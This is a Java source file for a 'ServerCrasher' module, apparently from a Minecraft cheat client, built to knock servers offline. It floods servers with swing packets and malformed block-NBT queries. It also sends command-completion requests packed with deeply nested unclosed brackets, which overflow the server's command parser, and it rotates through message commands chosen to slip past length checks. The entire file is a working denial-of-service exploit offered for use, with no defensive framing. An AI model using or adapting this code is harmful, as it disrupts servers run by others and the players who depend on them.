package io.github.lefraudeur.modules.exploit;

import io.github.lefraudeur.events.PreTickEvent;
import io.github.lefraudeur.gui.settings.types.BooleanSetting;
import io.github.lefraudeur.gui.settings.types.ModeSetting;
import io.github.lefraudeur.gui.settings.types.ValueSetting;
import io.github.lefraudeur.modules.Category;
import io.github.lefraudeur.modules.Info;
import io.github.lefraudeur.modules.Module;
import net.minecraft.network.packet.c2s.play.HandSwingC2SPacket;
import net.minecraft.network.packet.c2s.play.QueryBlockNbtC2SPacket;
import net.minecraft.network.packet.c2s.play.RequestCommandCompletionsC2SPacket;
import net.minecraft.util.Hand;
import net.minecraft.util.math.BlockPos;

import java.util.Random;
import java.util.stream.Collectors;
import java.util.stream.IntStream;


@Info(category = Category.EXPLOIT, name = "ServerCrasher",  description = "Crashes servers!!!", key = Module.key_none)
public final class ServerCrasher extends Module {
    public ServerCrasher() { super(); }
    private final ModeSetting mode = new ModeSetting("Mode", "What mode should the thingy use :)", "LiqwidBouns", "Swing", "Dev");
    private final ValueSetting packets = new ValueSetting("Packets", "", 1, 1, 10, 0);

    private final ValueSetting packets2 = new ValueSetting("Packets", "", 100, 1, 1200, 0);

    private final ValueSetting tickDelay = new ValueSetting("tickDelay", "", 20, 1, 30, 0);
    private final ValueSetting jsonLength  = new ValueSetting("JSON Length", "", 2032, 1, 2048, 0);
    private final BooleanSetting automode = new BooleanSetting("AutoMode", "", true);


    private final String[] knownWorkingMessages = {
            "msg",
            "minecraft:msg",
            "tell",
            "minecraft:tell",
            "tm",
            "teammsg",
            "minecraft:teammsg",
            "minecraft:w",
            "minecraft:me"
    };
    private final String message = "msg @a[nbt={PAYLOAD}]";
    private int ticksToWait = 0;
    private int messageIndex = 0;

    @Override
    protected void onEnable() {
        if (mode.isMode("LiqwidBouns")) {
            messageIndex = 0;
            int messageIndex = 0;
            if (automode.get()) return;

            // Made it smaller under 2048, but it still cannot throw stackoverflow every time.
            String overflow = generateJsonObject(jsonLength.getInt());

            // Latest server builds can kick if partialCommand length is greater than 2048,
            // probably can be compressed even more.
            String partialCommand = message.replace("{PAYLOAD}", overflow);
            for (int i = 0; i < 5; i++) {
                send(new RequestCommandCompletionsC2SPacket(0, partialCommand));
            }
            this.toggle();
        }
    }

    @Override
    public void onPreTickEvent(final PreTickEvent event) {
        if(isNull()) return;

        switch (mode.get()) {
            case "Swing":
                for (int i = packets2.getInt() - 1; i > 0; i--) {
                    this.send(new HandSwingC2SPacket(Hand.MAIN_HAND));
                }
                break;

            case "LiqwidBouns":
                if (ticksToWait <= tickDelay.getInt()) return;

                if (messageIndex == knownWorkingMessages.length - 1) {
                    messageIndex = 0;
                }

                String knownMessage = knownWorkingMessages[messageIndex] + message;
                // Keep the length on the maximum limit (2048 characters)
                int len = 2044 - knownMessage.length();
                String overflow = generateJsonObject(len);
                String partialCommand = knownMessage.replace("{PAYLOAD}", overflow);

                for (int i = 0; i < packets.getInt(); i++) {
                    send(new RequestCommandCompletionsC2SPacket(0, partialCommand));
                }

                messageIndex++;
                ticksToWait++;
                break;

            case "Dev":
                for (int i = packets2.getInt() - 1; i > 0; i--) {
                    this.send(new QueryBlockNbtC2SPacket(new Random().nextInt(), new BlockPos(0, (int) Double.MIN_VALUE, (int) Double.MAX_VALUE)));
                }
                break;
            default:
                return;
        }
    }

    private String generateJsonObject(int levels) {
        // Brigadier does not check for closing brackets
        // Until it is too late.

        // Replaced Object with array and removed closing brackets
        String in = IntStream.range(0, levels)
                .mapToObj(i -> "[")
                .collect(Collectors.joining());
        String json = "{a:" + in + "}";
        return json;
    }
}